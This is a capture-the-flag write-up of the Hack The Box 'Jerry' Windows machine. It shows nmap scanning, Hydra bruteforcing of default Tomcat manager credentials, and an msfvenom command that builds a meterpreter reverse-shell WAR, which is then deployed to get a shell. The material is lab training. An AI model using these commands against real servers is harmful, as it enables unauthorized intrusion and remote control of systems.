# Jerry Writeup

This is a short writeup of HTB Jerry, an easy Windows box

## Port scanning

We start by scanning open ports on the box with nmap to see what we're dealing with. Running a TCP scan for all ports alongwith service/version detection, we get the following results:

```console
kali@kali:~/Desktop/htb/jerry$ nmap -sT -sV 10.10.10.95 -A -p0-65535
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 04:19 EDT
Nmap scan report for 10.10.10.95
Host is up (0.039s latency).
Not shown: 65535 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

Note: Usually I like to run a UDP scan in the background just to cover all bases. Since it is very time consuming, it makes sense to initiate the scan and proceed with further enumeration in the meantime. In this case, the UDP scan yielded no results.

From the nmap scan above, we can draw the following conclusions:

- Port 8080 open
- Runs Apache Tomcat/Coyote JSP engine 1.1
- Version: Apache Tomcat 7.0.88
- No UDP ports open
- OS: Windows (HTB gives us this information)

## Service enumeration

We're dealing with only 1 port i.e. 8080 which is supposedly running a web server. Visiting the webpage on a browser, we see the following:

![webpage-1](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-1.png)

On the homepage we can see "manager app" which could possibly lead us to the admin console. Clicking on that button we see that it requires us to enter a username and password:

![webpage-2](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-2.png)

Trying out random creds such as ```admin:admin``` lands us a 403 and we see the following:

![webpage-3](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-3.png)

On the 403 page, we see that for this version of Tomcat (7.0.88), the default admin credentials are ```admin:s3cret```. Trying this out on the admin login, we get access to the admin console:

![webpage-5](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-5.png)

The credentials worked and this is our most lucrative option. We can see that there is an option to deploy war files and execute them. WAR (Web Application Archive) files are basically files used to distribute a collection of JAR-files, JavaServer Pages, Java Servlets, Java classes, XML files, tag libraries, static web pages and other resources that together constitute a web application.

Let's take a step back here and assume that we hadn't seen the default credentials on the 403. Having a quick look at how the login actually works. We fire up BurpSuite and turn intercept on to examine the traffic. Let's use the credentials ```blah:blah``` to see how it works:

![burp-1](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/burp-1.png)

Looking at the requests we see that it uses Basic Auth which just base64 encodes the username and password and forwards it.

![burp-2](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/burp-2.png)

We can decode the base64 string in BurpSuite as follows:

![burp-3](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/burp-3.png)

We can use [Hydra](https://github.com/vanhauser-thc/thc-hydra) to bruteforce the login. There are various wordlists that we can employ. A popular repository of wordlists is [SecLists](https://github.com/danielmiessler/SecLists) which contains various wordlists, one of which is default Tomcat passwords as shown below:

![hydra-1](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/hydra-1.png)

We can now initiate the Hydra bruteforce as follows:

```console
kali@kali:~/Desktop/htb/jerry$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-03 04:34:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 79 login tries, ~5 tries per task
[DATA] attacking http-get://10.10.10.95:8080/manager/html
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-03 04:34:22
```

Concluding the service enumeration, its safe to assume that we have a very lucrative exploitation path with the admin console at our disposal. We can prioritize our exploitation paths as follows:

1. Admin console exploitation
2. Server software vulnerability assessment
3. SSH bruteforce

## Exploitation

Before we get into actual exploitation, we can do some more enumeration on the admin console now that we have access to it. This is done to understand the nature of the machine so we gain more information on how to proceed with our exploit. Exploring the admin console, we discover the following:

![webpage-6](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-6.png)

We now have the following:

- JVM Version: 1.8.0_171-b11
- JVM Vendor: Oracle Corporation
- OS Name: Windows Server 2012 R2
- OS Version: 6.3
- OS Architecture: amd64

Now that we have a decent amount of information about the machine, we can proceed to exploitation. As seen earlier, the admin has an option to upload files and execute them. The type of file as mentioned earlier is a WAR file. We can try to upload a crafted WAR payload that will spawn a shell on the machine. To do so we can use metasploit's msfvenom. First, we need to see if the WAR format is supported by msfvenom:

```console
kali@kali:~/Desktop/htb/jerry$ msfvenom --help-formats

Executable formats
asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war

Transform formats
bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```

**NOTE:** Executable formats will place the payload into a complete valid executable file, along with all the headers, footers, information blocks, checksums, heap options, loading instructions etc that goes along with it. Transform formats will output code suitable for copying into a script of some description, covering a wide range of scripting and higher level languages as well as some generic options as well.

Now that we know that WAR is supported, we can build our payload. We already know that we are dealing with an x64 Windows system. So we can select the x64 Windows meterpreter. We set the listening IP and port and set the file type as WAR with -f.

kali@kali:~/Desktop/htb/jerry$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.11 LPORT=4444  -f war -o evil.war

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of war file: 2460 bytes
Saved as: evil.war

As mentioned previously, WAR files are archives. We can unzip the file we generated to have a look inside:

kali@kali:~/Desktop/htb/jerry$ unzip evil.war
Archive:  evil.war
   creating: META-INF/
  inflating: META-INF/MANIFEST.MF
   creating: WEB-INF/
  inflating: WEB-INF/web.xml
  inflating: qswppjdamzduqkn.jsp

The file named qswppjdamzduqkn.jsp is most likely the one that contains our actual payload. We can now upload the WAR file to the admin console:

![webpage-7](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-7.png)

After uploading the WAR file we can now see it on the admin console as an application (/evil) that can be executed:

![webpage-8](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-8.png)

We can click on the ```/evil``` application to see if it gets executed. However, on navigating to ```/evil```, we get a 404:

![webpage-9](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-9.png)

This is probably because the WAR file, as we saw earlier, is an archive. We should point it to the actual jsp file instead that contains the payload. In order to do so, we can navigate to ```http://10.10.10.95:8080/evil/qswppjdamzduqkn.jsp``` instead. This time, it shows that the payload is being executed

![webpage-10](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-10.png)

Now we need to start a listener to catch the shell from the machine. In order to do so, we can use the Metasploit multi handler. We set the payload to ```windows/x64/meterpreter/reverse_tcp``` and set the listening IP and Port as shown:

![msf-2](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/msf-2.png)

After running the listener and then refreshing the ```http://10.10.10.95:8080/evil/qswppjdamzduqkn.jsp``` page, we get a shell on the listener:

![msf-3](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/msf-3.png)

